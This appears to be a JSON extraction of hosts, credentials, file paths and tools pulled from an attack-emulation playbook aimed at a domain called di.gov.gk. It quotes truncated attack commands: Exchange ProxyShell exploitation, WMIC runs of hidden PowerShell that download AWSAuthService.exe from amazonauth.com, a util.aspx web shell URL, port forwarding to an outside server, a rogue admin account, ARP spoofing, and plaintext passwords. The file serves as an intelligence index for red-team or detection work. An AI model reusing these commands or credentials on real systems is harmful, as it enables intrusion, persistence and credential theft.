@@ -1,0 +1,469 @@
+{
+  "network_topology": {
+    "hosts": [
+      {
+        "ip_address": "151.102.64.6",
+        "netbios_name": null,
+        "fqdn": null,
+        "domains": null,
+        "urls": null,
+        "ports": null,
+        "role": "Exchange Server",
+        "confirmed_contexts": [
+          "msf> set RHOSTS 151.102.64.6"
+        ],
+        "tactical_context": [
+          "Exploit Exchange ProxyShell vulnerability, upload and execute AWSAuthService.exe via Meterpreter session"
+        ],
+        "confidence": 0.95
+      },
+      {
+        "ip_address": null,
+        "netbios_name": null,
+        "fqdn": "di.gov.gk",
+        "domains": [
+          "di.gov"
+        ],
+        "urls": null,
+        "ports": null,
+        "role": "Active Directory Domain",
+        "confirmed_contexts": [
+          "New-ADUser -Name \"Oliver Jones\" -GivenName \"Oliver\" -Surname \"Jones\" -SamAccountName \"oliver.jones\" -UserPrincipalName \"oliver.jones@di.gov.gk\" -AccountPassword (ConvertTo-SecureString \"1R34llyL0v3P1z",
+          "msf> set EMAIL Administrator@di.gov.gk"
+        ],
+        "tactical_context": [
+          "Exploit Exchange ProxyShell vulnerability, upload and execute AWSAuthService.exe via Meterpreter session",
+          "Remote execution on multiple hosts via WMIC to drop and run AWSAuthService.exe, mount remote shares, perform DNS beaconing, create privileged AD account, and conduct ARP spoofing for traffic interception"
+        ],
+        "confidence": 0.95
+      },
+      {
+        "ip_address": null,
+        "netbios_name": "DI-EX",
+        "fqdn": null,
+        "domains": null,
+        "urls": null,
+        "ports": null,
+        "role": "Exchange Server",
+        "confirmed_contexts": [
+          "o\tInteract with DI-EX beacon"
+        ],
+        "tactical_context": [
+          "Gather network and credential information (ipconfig, domain controllers, logon passwords) and capture NTLM hashes with Responder",
+          "Remote execution on multiple hosts via WMIC to drop and run AWSAuthService.exe, mount remote shares, perform DNS beaconing, create privileged AD account, and conduct ARP spoofing for traffic interception"
+        ],
+        "confidence": 0.95
+      },
+      {
+        "ip_address": "151.102.64.5",
+        "netbios_name": null,
+        "fqdn": null,
+        "domains": [
+          "amazonauth.com"
+        ],
+        "urls": [
+          "http://amazonauth.com:80/download/AWSAuthService.exe'"
+        ],
+        "ports": [
+          80
+        ],
+        "role": "Windows Server",
+        "confirmed_contexts": [
+          "Shell wmic /node:”151.102.64.5”  /user:”DI\\Administrator” /password:”P@ssw0rd” process call create “cmd.exe /c powershell -nop -w hidden -c \\”Invoke-WebRequest -Uri 'http://amazonauth.com:80/download/",
+          "Ssh fannie.sparks@151.102.64.5"
+        ],
+        "tactical_context": [
+          "Remote execution on multiple hosts via WMIC to drop and run AWSAuthService.exe, mount remote shares, perform DNS beaconing, create privileged AD account, and conduct ARP spoofing for traffic interception"
+        ],
+        "confidence": 0.95
+      },
+      {
+        "ip_address": null,
+        "netbios_name": "DI-DC",
+        "fqdn": null,
+        "domains": null,
+        "urls": null,
+        "ports": null,
+        "role": "Domain Controller",
+        "confirmed_contexts": [
+          "o\tInteract with DI-DC beacon"
+        ],
+        "tactical_context": [
+          "Remote execution on multiple hosts via WMIC to drop and run AWSAuthService.exe, mount remote shares, perform DNS beaconing, create privileged AD account, and conduct ARP spoofing for traffic interception"
+        ],
+        "confidence": 0.95
+      },
+      {
+        "ip_address": "151.102.65.144",
+        "netbios_name": null,
+        "fqdn": null,
+        "domains": [
+          "amazonauth.com"
+        ],
+        "urls": [
+          "http://amazonauth.com:80/download/AWSAuthService.exe'"
+        ],
+        "ports": [
+          80
+        ],
+        "role": "Windows Workstation",
+        "confirmed_contexts": [
+          "Shell wmic /node:”151.102.65.144”  /user:”DI\\rodrigo.allison” /password:”r4#Sw5GyL+5V” process call create “cmd.exe /c powershell -nop -w hidden -c \\”Invoke-WebRequest -Uri 'http://amazonauth.com:80/d"
+        ],
+        "tactical_context": [
+          "Remote execution on multiple hosts via WMIC to drop and run AWSAuthService.exe, mount remote shares, perform DNS beaconing, create privileged AD account, and conduct ARP spoofing for traffic interception"
+        ],
+        "confidence": 0.95
+      },
+      {
+        "ip_address": "151.102.65.142",
+        "netbios_name": null,
+        "fqdn": null,
+        "domains": [
+          "amazonauth.com"
+        ],
+        "urls": [
+          "http://amazonauth.com:80/download/AWSAuthService.exe'"
+        ],
+        "ports": [
+          80
+        ],
+        "role": "Windows Workstation",
+        "confirmed_contexts": [
+          "Shell wmic /node:”151.102.65.142”  /user:”DI\\shelia.serrano” /password:”xI#Yp6@4#8o#” process call create “cmd.exe /c powershell -nop -w hidden -c \\”Invoke-WebRequest -Uri 'http://amazonauth.com:80/do"
+        ],
+        "tactical_context": [
+          "Remote execution on multiple hosts via WMIC to drop and run AWSAuthService.exe, mount remote shares, perform DNS beaconing, create privileged AD account, and conduct ARP spoofing for traffic interception"
+        ],
+        "confidence": 0.95
+      },
+      {
+        "ip_address": "151.102.65.57",
+        "netbios_name": null,
+        "fqdn": null,
+        "domains": [
+          "amazonauth.com"
+        ],
+        "urls": [
+          "http://amazonauth.com:80/download/AWSAuthService.exe'"
+        ],
+        "ports": [
+          80
+        ],
+        "role": "Windows Workstation",
+        "confirmed_contexts": [
+          "Shell wmic /node:”151.102.65.57”  /user:”DI\\eduardo.wheeler” /password:”bL+6oA6P@W+x” process call create “cmd.exe /c powershell -nop -w hidden -c \\”Invoke-WebRequest -Uri 'http://amazonauth.com:80/do"
+        ],
+        "tactical_context": [
+          "Remote execution on multiple hosts via WMIC to drop and run AWSAuthService.exe, mount remote shares, perform DNS beaconing, create privileged AD account, and conduct ARP spoofing for traffic interception"
+        ],
+        "confidence": 0.95
+      },
+      {
+        "ip_address": "151.102.64.8",
+        "netbios_name": null,
+        "fqdn": null,
+        "domains": [
+          "amazonauth.com"
+        ],
+        "urls": [
+          "http://amazonauth.com:80/download/AWSAuthService.exe'",
+          "151.102.64.8/aspnet_client/util.aspx?cmd=%22net%20localgroup%20administrators%22”"
+        ],
+        "ports": [
+          80
+        ],
+        "role": "Web Server",
+        "confirmed_contexts": [
+          "Shell wmic /node:”151.102.64.8”  /user:”DI\\Administrator” /password:”P@ssw0rd” process call create “cmd.exe /c powershell -nop -w hidden -c \\”Invoke-WebRequest -Uri 'http://amazonauth.com:80/download/",
+          "(The web shell can be interacted with by using browser urls such as “151.102.64.8/aspnet_client/util.aspx?cmd=%22net%20localgroup%20administrators%22” )"
+        ],
+        "tactical_context": [
+          "Deploy web shell (util.aspx) in IIS, establish port forwarding for continued access, and set up scheduled task via CLR host script",
+          "Remote execution on multiple hosts via WMIC to drop and run AWSAuthService.exe, mount remote shares, perform DNS beaconing, create privileged AD account, and conduct ARP spoofing for traffic interception"
+        ],
+        "confidence": 0.95
+      },
+      {
+        "ip_address": "151.102.65.143",
+        "netbios_name": null,
+        "fqdn": null,
+        "domains": null,
+        "urls": null,
+        "ports": null,
+        "role": "Linux Server",
+        "confirmed_contexts": [
+          "ssh fannie.sparks@151.102.65.143",
+          "sudo nmap -sV -O 151.102.65.143"
+        ],
+        "tactical_context": [
+          "Remote execution on multiple hosts via WMIC to drop and run AWSAuthService.exe, mount remote shares, perform DNS beaconing, create privileged AD account, and conduct ARP spoofing for traffic interception"
+        ],
+        "confidence": 0.95
+      },
+      {
+        "ip_address": "31.148.54.96",
+        "netbios_name": null,
+        "fqdn": null,
+        "domains": null,
+        "urls": null,
+        "ports": null,
+        "role": "File Share / Staging Server",
+        "confirmed_contexts": [
+          "rportfwd 443 31.148.54.96 6666",
+          "net use S: \\\\31.148.54.96\\Share"
+        ],
+        "tactical_context": [
+          "Deploy web shell (util.aspx) in IIS, establish port forwarding for continued access, and set up scheduled task via CLR host script",
+          "Remote execution on multiple hosts via WMIC to drop and run AWSAuthService.exe, mount remote shares, perform DNS beaconing, create privileged AD account, and conduct ARP spoofing for traffic interception"
+        ],
+        "confidence": 0.95
+      },
+      {
+        "ip_address": null,
+        "netbios_name": "DI-DC",
+        "fqdn": "di-dc.di.gov.gk",
+        "domains": [
+          "di-dc.di"
+        ],
+        "urls": null,
+        "ports": null,
+        "role": "Domain Controller",
+        "confirmed_contexts": [
+          "nslookup di-dc.di.gov.gk"
+        ],
+        "tactical_context": [
+          "Remote execution on multiple hosts via WMIC to drop and run AWSAuthService.exe, mount remote shares, perform DNS beaconing, create privileged AD account, and conduct ARP spoofing for traffic interception"
+        ],
+        "confidence": 0.95
+      },
+      {
+        "ip_address": "151.102.65.1",
+        "netbios_name": null,
+        "fqdn": null,
+        "domains": null,
+        "urls": null,
+        "ports": null,
+        "role": "Network Device (Cisco Router)",
+        "confirmed_contexts": [
+          "sudo -E ./arpspoofer.py -i ens33 -f 151.102.65.1",
+          "ip nat inside source static tcp 151.102.65.1 443 interface GigabitEthernet3 8443",
+          "proxychains ssh cisco@151.102.65.1 (need to check proxychains4.conf)"
+        ],
+        "tactical_context": [
+          "Host HTTP server, upload and execute PowerShell brute‑force script on target, and manipulate Cisco NAT configuration via proxychains SSH",
+          "Remote execution on multiple hosts via WMIC to drop and run AWSAuthService.exe, mount remote shares, perform DNS beaconing, create privileged AD account, and conduct ARP spoofing for traffic interception"
+        ],
+        "confidence": 0.95
+      },
+      {
+        "ip_address": null,
+        "netbios_name": "DI-WEB",
+        "fqdn": null,
+        "domains": null,
+        "urls": null,
+        "ports": null,
+        "role": "Web Server",
+        "confirmed_contexts": [
+          "o\tInteract with DI-WEB beacon"
+        ],
+        "tactical_context": [
+          "Deploy web shell (util.aspx) in IIS, establish port forwarding for continued access, and set up scheduled task via CLR host script"
+        ],
+        "confidence": 0.95
+      },
+      {
+        "ip_address": null,
+        "netbios_name": "DI-W10-3",
+        "fqdn": null,
+        "domains": null,
+        "urls": null,
+        "ports": null,
+        "role": "Windows 10 Workstation",
+        "confirmed_contexts": [
+          "o\tInteract with DI-W10-3 beacon",
+          "Upload clrhost.ps1 to DI-W10-3, DI-W10-5, and DI-W11-5 using CS:"
+        ],
+        "tactical_context": [
+          "Upload clrhost.ps1 to multiple hosts and create a high‑privilege scheduled task to run it at logon",
+          "Deploy web shell (util.aspx) in IIS, establish port forwarding for continued access, and set up scheduled task via CLR host script"
+        ],
+        "confidence": 0.95
+      },
+      {
+        "ip_address": null,
+        "netbios_name": "DI-W11-5",
+        "fqdn": null,
+        "domains": null,
+        "urls": null,
+        "ports": null,
+        "role": "Windows 11 Workstation",
+        "confirmed_contexts": [
+          "o\tInteract with DI-W11-5 beacon"
+        ],
+        "tactical_context": [
+          "Host HTTP server, upload and execute PowerShell brute‑force script on target, and manipulate Cisco NAT configuration via proxychains SSH"
+        ],
+        "confidence": 0.95
+      },
+      {
+        "ip_address": null,
+        "netbios_name": "DI-W10-5",
+        "fqdn": null,
+        "domains": null,
+        "urls": null,
+        "ports": null,
+        "role": "Windows 10 Workstation",
+        "confirmed_contexts": [
+          "o\t Interact with DI-W10-5  beacon"
+        ],
+        "tactical_context": [
+          "Host HTTP server, upload and execute PowerShell brute‑force script on target, and manipulate Cisco NAT configuration via proxychains SSH"
+        ],
+        "confidence": 0.95
+      }
+    ]
+  },
+  "credentials": {
+    "accounts": [
+      {
+        "username": null,
+        "password": null,
+        "email": "Administrator@di.gov.gk",
+        "credential_type": "email",
+        "privilege_level": null,
+        "context": "msf> set EMAIL Administrator@di.gov.gk",
+        "section_intent": "Exploit Exchange ProxyShell vulnerability, upload and execute AWSAuthService.exe via Meterpreter session",
+        "confidence": 0.95
+      },
+      {
+        "username": "Administrator",
+        "password": null,
+        "email": null,
+        "credential_type": "ssh",
+        "privilege_level": null,
+        "context": "Ssh -p 2222 Administrator@localhost",
+        "section_intent": "Gather network and credential information (ipconfig, domain controllers, logon passwords) and capture NTLM hashes with Responder",
+        "confidence": 0.95
+      },
+      {
+        "username": "DI\\Administrator",
+        "password": "P@ssw0rd",
+        "email": null,
+        "credential_type": "wmic",
+        "privilege_level": null,
+        "context": "Shell wmic /node:”151.102.64.5”  /user:”DI\\Administrator” /password:”P@ssw0rd” process call create “cmd.exe /c powershell -nop -w hidden -c \\”Invoke-WebRequest -Uri 'http://amazonauth.com:80/download/",
+        "section_intent": "Remote execution on multiple hosts via WMIC to drop and run AWSAuthService.exe, mount remote shares, perform DNS beaconing, create privileged AD account, and conduct ARP spoofing for traffic interception",
+        "confidence": 0.95
+      },
+      {
+        "username": "DI\\rodrigo.allison",
+        "password": "r4#Sw5GyL+5V",
+        "email": null,
+        "credential_type": "wmic",
+        "privilege_level": null,
+        "context": "Shell wmic /node:”151.102.65.144”  /user:”DI\\rodrigo.allison” /password:”r4#Sw5GyL+5V” process call create “cmd.exe /c powershell -nop -w hidden -c \\”Invoke-WebRequest -Uri 'http://amazonauth.com:80/d",
+        "section_intent": "Remote execution on multiple hosts via WMIC to drop and run AWSAuthService.exe, mount remote shares, perform DNS beaconing, create privileged AD account, and conduct ARP spoofing for traffic interception",
+        "confidence": 0.95
+      },
+      {
+        "username": "DI\\shelia.serrano",
+        "password": "xI#Yp6@4#8o#",
+        "email": null,
+        "credential_type": "wmic",
+        "privilege_level": null,
+        "context": "Shell wmic /node:”151.102.65.142”  /user:”DI\\shelia.serrano” /password:”xI#Yp6@4#8o#” process call create “cmd.exe /c powershell -nop -w hidden -c \\”Invoke-WebRequest -Uri 'http://amazonauth.com:80/do",
+        "section_intent": "Remote execution on multiple hosts via WMIC to drop and run AWSAuthService.exe, mount remote shares, perform DNS beaconing, create privileged AD account, and conduct ARP spoofing for traffic interception",
+        "confidence": 0.95
+      },
+      {
+        "username": "DI\\eduardo.wheeler",
+        "password": "bL+6oA6P@W+x",
+        "email": null,
+        "credential_type": "wmic",
+        "privilege_level": null,
+        "context": "Shell wmic /node:”151.102.65.57”  /user:”DI\\eduardo.wheeler” /password:”bL+6oA6P@W+x” process call create “cmd.exe /c powershell -nop -w hidden -c \\”Invoke-WebRequest -Uri 'http://amazonauth.com:80/do",
+        "section_intent": "Remote execution on multiple hosts via WMIC to drop and run AWSAuthService.exe, mount remote shares, perform DNS beaconing, create privileged AD account, and conduct ARP spoofing for traffic interception",
+        "confidence": 0.95
+      },
+      {
+        "username": "fannie.sparks",
+        "password": null,
+        "email": null,
+        "credential_type": "ssh",
+        "privilege_level": null,
+        "context": "ssh fannie.sparks@151.102.65.143",
+        "section_intent": "Remote execution on multiple hosts via WMIC to drop and run AWSAuthService.exe, mount remote shares, perform DNS beaconing, create privileged AD account, and conduct ARP spoofing for traffic interception",
+        "confidence": 0.95
+      },
+      {
+        "username": "oliver.jones",
+        "password": "1R34llyL0v3P1zz4!",
+        "email": "oliver.jones@di.gov.gk",
+        "credential_type": "powershell",
+        "privilege_level": null,
+        "context": "New-ADUser -Name \"Oliver Jones\" -GivenName \"Oliver\" -Surname \"Jones\" -SamAccountName \"oliver.jones\" -UserPrincipalName \"oliver.jones@di.gov.gk\" -AccountPassword (ConvertTo-SecureString \"1R34llyL0v3P1z",
+        "section_intent": "Remote execution on multiple hosts via WMIC to drop and run AWSAuthService.exe, mount remote shares, perform DNS beaconing, create privileged AD account, and conduct ARP spoofing for traffic interception",
+        "confidence": 0.95
+      },
+      {
+        "username": "cisco",
+        "password": null,
+        "email": null,
+        "credential_type": "ssh",
+        "privilege_level": null,
+        "context": "proxychains ssh cisco@151.102.65.1 (need to check proxychains4.conf)",
+        "section_intent": "Host HTTP server, upload and execute PowerShell brute‑force script on target, and manipulate Cisco NAT configuration via proxychains SSH",
+        "confidence": 0.95
+      }
+    ]
+  },
+  "files_and_paths": {
+    "windows_paths": [
+      "C:\\Windows\\AWSAuthService.exe’",
+      "C:\\Windows\\System32",
+      "C:\\Windows\\System32\\SymantecSysMonitor.exe",
+      "C:\\inetpub\\wwwroot\\aspnet_client",
+      "S:\\*"
+    ],
+    "unix_paths": [
+      "/home/user/Desktop/AWSAuthService.exe",
+      "/home/user/clrhost.ps1",
+      "/home/user/run_brute.ps1",
+      "/home/user/sshbrutesim",
+      "/home/user/util.aspx"
+    ],
+    "unc_shares": [
+      "\\\\31.148.54.96\\Share"
+    ],
+    "file_artifacts": [
+      "AWSAuthService.exe",
+      "SymantecSysMonitor.exe",
+      "arpspoofer.py",
+      "clrhost.ps1",
+      "cmd.exe",
+      "powershell.exe",
+      "run_brute.ps1",
+      "util.aspx"
+    ]
+  },
+  "commands_and_tools": [
+    "meterpreter",
+    "msfconsole",
+    "nmap",
+    "powershell",
+    "proxychains",
+    "shell",
+    "sliver",
+    "ssh",
+    "wmic"
+  ],
+  "extraction_metadata": {
+    "total_chunks_analyzed": 53,
+    "network_hosts_found": 17,
+    "credentials_found": 9,
+    "files_found": 19,
+    "commands_found": 9,
+    "average_confidence": 0.95
+  }
+}
